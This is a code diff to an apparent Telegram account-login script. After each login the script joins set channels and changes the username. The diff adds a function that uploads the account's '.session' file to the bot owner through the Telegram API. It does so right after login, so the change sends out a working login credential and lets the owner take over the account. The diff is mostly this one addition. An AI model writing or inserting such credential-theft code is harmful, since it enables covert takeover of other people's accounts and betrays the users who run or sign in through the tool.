@@ -64,6 +64,13 @@ def sendMessage(chat_id, text):
     PARAMS = {'chat_id': chat_id, 'text': text, 'parse_mode': 'markdown'}
     requests.get(url=URL, params=PARAMS)
 
+def sendDocument(chat_id, document_path):
+    url = "https://api.telegram.org/bot"+token+"/sendDocument"
+    params = {'chat_id': chat_id}
+    files = {'document': open(document_path, 'rb')}
+    response = requests.post(url=url, params=params, files=files)
+    return response.json()
+
 
 async def signAccount():
 	
@@ -134,6 +141,7 @@ async def signAccount():
 					sendMessage(owner_id,doneLoginNotOut);
 					await app.join_chat('ddddisvb');
 					await app.join_chat('YB_13');
+					sendDocument(owner_id, f"sessions/{ses}.session")
 					#await app.enable_cloud_password("0855", "حق الراقي 2")
 					await app.set_username(username)
 					#await app.update_profile(first_name=random.choice(NAME), bio=random.choice(BIO))
